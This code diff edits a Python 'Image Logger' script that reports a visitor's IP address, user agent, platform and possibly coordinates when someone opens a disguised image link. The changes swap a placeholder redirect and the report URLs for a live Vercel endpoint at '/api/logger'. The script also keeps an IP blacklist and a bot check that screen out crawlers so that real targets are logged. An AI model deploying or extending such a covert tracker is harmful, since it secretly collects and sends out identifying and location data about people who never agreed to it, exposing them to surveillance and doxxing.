@@ -23,10 +23,10 @@ config = {
     "linkAlerts": True,
     "buggedImage": True,
     "antiBot": 1,
-    "redirect": {"redirect": False, "page": "https://your-link.here"},
+    "redirect": {"redirect": False, "page": "https://giffy-ecru-omega.vercel.app/"},
 }
 
-blacklistedIPs = ("27", "104", "143", "164")  # Optional
+blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -60,7 +60,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A"):
                     "title": "Image Logger - Link Sent",
                     "color": config["color"],
                     "description": f"A logging link was sent!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** {bot}",
-                    "url": "https://giffy-ecru-omega.vercel.app/",
+                    "url": "https://giffy-ecru-omega.vercel.app/api/logger",
                     "image": {"url": config["image"]}
                 }]
             })
@@ -105,7 +105,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A"):
 **User Agent:**
 {useragent}
 """,
-            "url": "https://giffy-ecru-omega.vercel.app/",
+            "url": "https://giffy-ecru-omega.vercel.app/api/logger",
             "image": {"url": config["image"]}
         }]
     }
